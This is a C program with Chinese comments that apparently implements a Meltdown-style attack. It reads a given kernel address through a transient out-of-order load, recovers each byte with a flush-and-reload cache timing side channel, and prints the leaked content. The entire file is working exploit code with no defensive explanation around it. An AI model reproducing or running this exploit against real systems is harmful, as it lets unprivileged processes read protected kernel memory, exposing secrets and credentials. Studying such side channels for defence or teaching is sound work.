#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define size 4096  
jmp_buf Jump_Buffer;
static char volatile target[256*size]={};
static void SegErrCatch(int sig){
    siglongjmp(Jump_Buffer,1);
}
static inline void memoryaccess(void *p) {
  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");//读取该字节
}
int get_time(volatile char *addr){ //获得读取内存的时间 
    unsigned long long  time1,time2;
    int t=0;
    time1 = __rdtscp(&t);
    memoryaccess(addr);
    time2 = __rdtscp(&t);
    return time2-time1;
}
int loadpage(){  //判断攻击位置
    unsigned int volatile pagenum,ans,min=0xffffffff,time;
    for (int i=0;i<256;i++){
        pagenum=((i * 167) + 13) & 255;
        time=get_time(target+size*pagenum);
        if (min>time){
            min=time;
            ans=pagenum;
        }
    }
    return ans;   
}
int attack(char* addr) //核心代码
{	
	if(!sigsetjmp(Jump_Buffer,1)){
	asm volatile (
        "1:\n\t"

		".rept 100\n\t"
		"add $0x100, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%rax\n\t"
		"shl $12, %%rax\n\t"
		"mov (%[target], %%rax, 1), %%rbx\n"

		:
		: [target] "r" (target),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);	
	}
	else{
		return 0;
	}
}
void readbyte(int fd,char *addr){//读取内容
    static char buf[256];
    memset(target,0xff, sizeof(target));
    pread(fd, buf, sizeof(buf), 0);   
    for (int i=0;i<256;i++){
        _mm_clflush(target+i*size);
    }
    if (attack(addr)!=0) {
		puts("攻击失败");
		exit(0);
	}
    return;
}
int main(int argc, const char* * argv){      
    int score[256];
    char* addr;
    char content[100];
    int tmp,len,max1,max2;
    int fd = open("/proc/version", O_RDONLY);
			
    signal(SIGSEGV,SegErrCatch);   
	sscanf(argv[1],"%lx",&addr);
    sscanf(argv[2],"%d",&len);
    
    for (int j=0;j<len;j++){
        memset(score,0,sizeof(score));
		max1=max2=0;
		while (score[max1]<=2*score[max2]+20){
			readbyte(fd,addr);
			tmp=loadpage();
            score[tmp]++;
			if (tmp!=max1){
				if (score[tmp]>score[max1]) {
					max2=max1;
					max1=tmp;	
				}
				else if (score[tmp]>score[max2]) {
					max2=tmp;
				}
			}			
        }
		tmp=0;
		for (int i=0;i<256;i++){
			if (score[i]>score[tmp]) tmp=i;
		}
        printf("地址为：%lx，内容为：%c\n",addr,tmp);  
        content[j]=tmp;
        addr++;      
    }
	content[len]='\0';
    printf("完整内容为:\n%s\n",content);
}
